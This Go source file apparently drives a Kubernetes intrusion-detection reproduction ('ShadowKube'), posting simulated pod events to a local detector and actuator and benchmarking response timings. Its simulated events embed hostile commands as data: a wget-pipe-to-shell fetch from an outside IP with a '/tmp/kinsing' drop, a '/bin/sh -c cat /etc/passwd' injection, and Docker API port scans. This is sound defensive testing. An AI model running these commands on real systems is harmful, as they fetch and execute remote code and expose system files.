// Command attack-sim runs the deterministic Phase 5 scenarios and actuator benchmark.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/shadowkube-repro/pkg/event"
)

type config struct {
	detectorURL string
	actuatorURL string
	runs        int
	output      string
	markdown    string
}

type alarm struct {
	Group       string       `json:"group"`
	Node        string       `json:"node"`
	Pod         string       `json:"pod"`
	PodIP       string       `json:"podIp"`
	SourceIP    string       `json:"sourceIp,omitempty"`
	SourceEvent *event.Event `json:"sourceEvent,omitempty"`
}

type actuatorResponse struct {
	Decision string `json:"decision"`
	Reason   string `json:"reason"`
	Record   struct {
		Timings struct {
			Phase1 float64 `json:"phase1"`
			Phase2 float64 `json:"phase2"`
			Phase3 float64 `json:"phase3"`
			Total  float64 `json:"total"`
		} `json:"timings"`
	} `json:"record"`
}

type benchmarkRow struct {
	Run       int     `json:"run"`
	Phase1Sec float64 `json:"phase1Seconds"`
	Phase2Sec float64 `json:"phase2Seconds"`
	Phase3Sec float64 `json:"phase3Seconds"`
	TotalSec  float64 `json:"totalSeconds"`
}

type benchmarkReport struct {
	GeneratedAt string         `json:"generatedAt"`
	Runs        int            `json:"runs"`
	Rows        []benchmarkRow `json:"rows"`
	Average     benchmarkRow   `json:"average"`
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "attack-sim: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	cfg, err := loadConfig()
	if err != nil {
		return err
	}
	if len(os.Args) != 2 {
		return errors.New("usage: attack-sim <case-study-1|case-study-2|benchmark>")
	}
	switch os.Args[1] {
	case "case-study-1":
		return runCase(cfg, "case-study-1", "203.0.113.37", "docker-api")
	case "case-study-2":
		return runCase(cfg, "case-study-2", "203.0.113.125", "command-injection")
	case "benchmark":
		return runBenchmark(cfg)
	default:
		return fmt.Errorf("unknown command %q", os.Args[1])
	}
}

func loadConfig() (config, error) {
	cfg := config{
		detectorURL: envOr("DETECTOR_URL", "http://127.0.0.1:8080/events"),
		actuatorURL: envOr("ACTUATOR_URL", "http://127.0.0.1:8081/alarms"),
		output:      envOr("BENCHMARK_OUTPUT", "benchmark-results.json"),
		markdown:    envOr("BENCHMARK_MARKDOWN", "benchmark-results.md"),
		runs:        10,
	}
	if raw := os.Getenv("BENCHMARK_RUNS"); raw != "" {
		n, err := strconv.Atoi(raw)
		if err != nil || n < 1 {
			return config{}, fmt.Errorf("BENCHMARK_RUNS must be a positive integer: %q", raw)
		}
		cfg.runs = n
	}
	return cfg, nil
}

func runCase(cfg config, name, sourceIP, attackType string) error {
	group := "labels:group=phase5-" + strings.ReplaceAll(name, "-", "_") + "-" + strconv.FormatInt(time.Now().UnixNano(), 10)
	pod := event.PodMeta{UID: "phase5-" + strconv.FormatInt(time.Now().UnixNano(), 10), Name: "weather-frontend", Namespace: "dev-namespace", Labels: map[string]string{"group": strings.TrimPrefix(group, "labels:group=")}}
	events := []event.Event{
		newEvent(event.TypeExec, pod, event.Payload{Cmd: "/usr/bin/python frontend.py"}),
		newEvent(event.TypeFile, pod, event.Payload{Path: "/app/frontend.py", FileOp: "read"}),
		newEvent(event.TypeNet, pod, event.Payload{DstIP: "10.42.0.20", DstPort: 8000}),
	}
	if attackType == "docker-api" {
		events = append(events,
			newEvent(event.TypeExec, pod, event.Payload{Cmd: "wget -q -O - 94.103.87.71/d.sh | sh"}),
			newEvent(event.TypeFile, pod, event.Payload{Path: "/tmp/kinsing", FileOp: "write"}),
		)
	} else {
		events = append(events,
			newEvent(event.TypeExec, pod, event.Payload{Cmd: "/bin/sh -c cat /etc/passwd"}),
			newEvent(event.TypeFile, pod, event.Payload{Path: "/etc/passwd", FileOp: "read"}),
		)
	}
	for i := 0; i < 4; i++ {
		events = append(events, newEvent(event.TypeNet, pod, event.Payload{DstIP: fmt.Sprintf("198.51.100.%d", i+10), DstPort: 2375}))
	}
	body, err := marshalEvents(events)
	if err != nil {
		return err
	}
	start := time.Now()
	response, err := post(cfg.detectorURL, "application/x-ndjson", body)
	if err != nil {
		return fmt.Errorf("post events: %w", err)
	}
	var detectorResult struct {
		Received int `json:"received"`
		Alarms   int `json:"alarms"`
	}
	if err := json.Unmarshal(response, &detectorResult); err != nil {
		return fmt.Errorf("decode detector response: %w", err)
	}
	fmt.Printf("%s: sent=%d alarms=%d detectorRequest=%s group=%s\n", name, detectorResult.Received, detectorResult.Alarms, time.Since(start).Round(time.Millisecond), group)
	if detectorResult.Alarms == 0 {
		return errors.New("detector did not raise an alarm; use a fresh group or verify the baseline/threshold configuration")
	}
	alarmBody, _ := json.Marshal(alarm{Group: group, Node: "phase5-node-0", Pod: pod.UID, PodIP: "10.42.0.17", SourceIP: sourceIP, SourceEvent: &events[len(events)-1]})
	actuatorResponse, err := post(cfg.actuatorURL, "application/json", alarmBody)
	if err != nil {
		return fmt.Errorf("post alarm to actuator: %w", err)
	}
	fmt.Printf("%s actuator response: %s\n", name, strings.TrimSpace(string(actuatorResponse)))
	return nil
}

func runBenchmark(cfg config) error {
	report := benchmarkReport{GeneratedAt: time.Now().UTC().Format(time.RFC3339), Runs: cfg.runs, Rows: make([]benchmarkRow, 0, cfg.runs)}
	for i := 1; i <= cfg.runs; i++ {
		payload := alarm{Group: "labels:group=phase5-benchmark", Node: "phase5-node-0", Pod: fmt.Sprintf("phase5-benchmark-%d", i), PodIP: fmt.Sprintf("10.42.1.%d", i)}
		body, _ := json.Marshal(payload)
		start := time.Now()
		response, err := post(cfg.actuatorURL, "application/json", body)
		if err != nil {
			return fmt.Errorf("benchmark run %d: %w", i, err)
		}
		var result actuatorResponse
		if err := json.Unmarshal(response, &result); err != nil {
			return fmt.Errorf("benchmark run %d response: %w", i, err)
		}
		row := benchmarkRow{Run: i, Phase1Sec: durationSeconds(result.Record.Timings.Phase1), Phase2Sec: durationSeconds(result.Record.Timings.Phase2), Phase3Sec: durationSeconds(result.Record.Timings.Phase3), TotalSec: durationSeconds(result.Record.Timings.Total)}
		if row.TotalSec == 0 {
			row.TotalSec = time.Since(start).Seconds()
		}
		report.Rows = append(report.Rows, row)
		report.Average.Phase1Sec += row.Phase1Sec
		report.Average.Phase2Sec += row.Phase2Sec
		report.Average.Phase3Sec += row.Phase3Sec
		report.Average.TotalSec += row.TotalSec
	}
	report.Average.Run = cfg.runs
	report.Average.Phase1Sec /= float64(cfg.runs)
	report.Average.Phase2Sec /= float64(cfg.runs)
	report.Average.Phase3Sec /= float64(cfg.runs)
	report.Average.TotalSec /= float64(cfg.runs)
	data, _ := json.MarshalIndent(report, "", "  ")
	if err := os.WriteFile(cfg.output, append(data, '\n'), 0o644); err != nil {
		return fmt.Errorf("write %s: %w", cfg.output, err)
	}
	markdown := fmt.Sprintf("# ShadowKube Phase 5 Benchmark\n\nGenerated: `%s`\n\n| Stage | Average seconds | Paper Table 6 seconds |\n|---|---:|---:|\n| Network reconfiguration | %.3f | 2.168 |\n| Pods sanitation | %.3f | 5.005 |\n| Sensitive information alteration | %.3f | 1.409 |\n| Total | %.3f | 9.612 |\n\nRuns: %d. Values are measured from the actuator response and are environment-dependent.\n", report.GeneratedAt, report.Average.Phase1Sec, report.Average.Phase2Sec, report.Average.Phase3Sec, report.Average.TotalSec, cfg.runs)
	if err := os.WriteFile(cfg.markdown, []byte(markdown), 0o644); err != nil {
		return fmt.Errorf("write %s: %w", cfg.markdown, err)
	}
	fmt.Printf("benchmark complete: %s and %s\n%s", cfg.output, cfg.markdown, markdown)
	return nil
}

func newEvent(kind event.Type, pod event.PodMeta, payload event.Payload) event.Event {
	return event.Event{TS: time.Now().UTC(), Type: kind, Node: "phase5-node-0", Pod: pod, Payload: payload}
}

func marshalEvents(events []event.Event) ([]byte, error) {
	var body bytes.Buffer
	encoder := json.NewEncoder(&body)
	for _, ev := range events {
		if err := encoder.Encode(ev); err != nil {
			return nil, err
		}
	}
	return body.Bytes(), nil
}

func post(url, contentType string, body []byte) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	response, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HTTP %s: %s", resp.Status, strings.TrimSpace(string(response)))
	}
	return response, nil
}

func durationSeconds(nanoseconds float64) float64 { return nanoseconds / float64(time.Second) }

func envOr(key, fallback string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return fallback
}
